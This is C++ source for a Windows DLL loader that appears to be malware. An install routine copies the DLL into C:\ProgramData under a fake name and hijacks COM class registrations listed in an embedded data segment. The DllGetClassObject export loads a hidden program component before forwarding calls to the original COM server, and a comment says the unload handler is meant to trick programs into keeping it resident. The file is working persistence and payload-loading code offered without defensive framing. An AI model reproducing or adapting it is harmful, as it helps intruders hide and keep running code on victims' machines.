#include <ComponentUtilities.h>
#include <PELoader.h>
#include <TcpShortDef.h>
#include <LoaderCore.h>

#include <fstream>
#include <shellapi.h>
#include <sstream>
#include <optional>

//Components required defines
#define COMPONENT_TYPE ClientTypes::no_load

#pragma section(segment_qdata, read)
store_variable(segment_qdata) QDATA_STORAGE storage { { 0 }, 1 };


HMODULE loadedLib = NULL;		//Loaded COM dll instance
HMODULE thisDll;				//This dll instance
FILE_MUTEX_STRUCT thisLock;


BOOL WINAPI DllMain(HINSTANCE hinstDLL, DWORD fdwReason, LPVOID lpvReserved) {
	switch (fdwReason) {
		case DLL_PROCESS_ATTACH: {
			DBG("Process attached");
			thisDll = hinstDLL;
			srand(time(NULL));
			break;
		}
		case DLL_PROCESS_DETACH: {
			DBG("Process dettached");
			break;
		}
		case DLL_THREAD_ATTACH: {
			DBG("Thread attached");
			break;
		}
		case DLL_THREAD_DETACH: {
			break;
		}
	}

	return true;
}

void CALLBACK debug(HWND hwnd, HINSTANCE hinst, LPSTR lpszCmdLine, int nCmdShow) {
	// Although debug will be exported only in debug version add this checkpoint

#ifdef  _DEBUG
	STOP;
	FILE_MUTEX_STRUCT lib_file = getNextLibComponent(ClientTypes::any_load);
	initiateComponent(lib_file);
	STOP;
#endif
}

//Error code should be 1000
//This is the signature for thread function
DWORD WINAPI coInitComponent(LPVOID lpParameter) {
	DBG("Intro ....Locking loader ERROR");
	return 1000;
}

//Returns version from data segment
DWORD getVersion() {
	return storage.version;
}

//Returns the component type
DWORD getType() {
	return (DWORD)COMPONENT_TYPE;
}



/*
This loader will NOT be encripted!
*/
void CALLBACK install(HWND hwnd, HINSTANCE hinst, LPSTR lpszCmdLine, int nCmdShow) {
	char loader_cstr_path[1024];
	std::string current_loader_path, loader_name;
	std::string fake_path_root = "C:\\ProgramData\\";
	std::string current_path;

	GetModuleFileNameA(thisDll, loader_cstr_path, sizeof(loader_cstr_path));
	current_loader_path = std::string(loader_cstr_path);
	if (current_loader_path.find_last_of('\\') != std::string::npos) {
		loader_name = current_loader_path.substr(current_loader_path.find_last_of('\\') + 1);
		current_path = current_loader_path.substr(0, current_loader_path.find_last_of('\\'));
	} else return;

	//Install
	std::string resource_clsid;
	std::optional<std::string> fake_loader_name = installOnSystem2(fake_path_root, loader_name, current_path);

	if (!fake_loader_name) return;

	for (int i = 0; (resource_clsid = getNextStringFromMemory(storage.extra, STORAGE_EXTRA_MAX_SIZE, i)).size() != 0; i++) {
		hijackCLSID(resource_clsid, fake_loader_name.value());
	}
}

void CALLBACK uninstall(HWND hwnd, HINSTANCE hinst, LPSTR lpszCmdLine, int nCmdShow) {
#ifdef  _DEBUG
	unistallSystem();
#endif //  _DEBUG
}


HRESULT __stdcall DllGetClassObject(REFCLSID rclsid, REFIID riid, LPVOID* ppv) {
	//Clsid will identify the object from dll
	//Clsid is linked to the dll path in regedit

	std::string guid_text = guidToString(rclsid);
	std::string reg_path = std::string("Software\\Classes\\CLSID\\") + guid_text + "\\InProcServer32";
	char data_value[2048];
	DWORD buffer_size = sizeof(data_value);

	DBG(guid_text.c_str());

	//Load program component first
	FILE_MUTEX_STRUCT lib_file = getNextLibComponent(ClientTypes::any_load);
	initiateComponent(lib_file);


	//COM flow divertor
	buffer_size = sizeof(data_value);
	if (RegGetValueA(HKEY_CURRENT_USER, reg_path.c_str(), "Alternative", RRF_RT_REG_SZ, NULL, data_value, &buffer_size) == ERROR_SUCCESS) {
		DBG("Found replacement dll in Alternative key");
	} else {
		DBG("Alternative dll not found. Cannot use default value because it might crash. Searching Local Machine");

		buffer_size = sizeof(data_value);
		if (RegGetValueA(HKEY_LOCAL_MACHINE, reg_path.c_str(), "", RRF_RT_REG_SZ, NULL, data_value, &buffer_size) != ERROR_SUCCESS) RETURN("Not found in local machine.", CLASS_E_CLASSNOTAVAILABLE);

		DBG("Found dll in local machine");
	}

	DBG(data_value);
	HMODULE lib = LoadLibraryA(data_value);
	if (lib == NULL) RETURN("Lib didn't load", CLASS_E_CLASSNOTAVAILABLE);
	loadedLib = lib;

	LPFNGETCLASSOBJECT DllFunc = (LPFNGETCLASSOBJECT)GetProcAddress(lib, "DllGetClassObject");
	if (DllFunc == NULL) {
		RETURN("DllGetClassObject function is null", CLASS_E_CLASSNOTAVAILABLE);
	}

	HRESULT res = DllFunc(rclsid, riid, ppv);
	if (res == S_OK) DBG("S_OK");
	else DBG("CLASS_E_CLASSNOTAVAILABLE");

	return res;
}

HRESULT __stdcall DllCanUnloadNow() {
	//If some errors occur return S_FALSE. This means there still are some references to this library. 
	//This will trick programs into keeping us alive.

	if (loadedLib == NULL) RETURN("DllCanUnloadNow: Err.No Library loaded.", S_OK);

	LPFNCANUNLOADNOW DllFunc = (LPFNCANUNLOADNOW)GetProcAddress(loadedLib, "DllCanUnloadNow");

	HRESULT res = DllFunc();
	if (res == S_OK) DBG("CanUnloadNow?  S_OK");
	else DBG("CanUnloadNow?  S_FALSE");

	return res;
}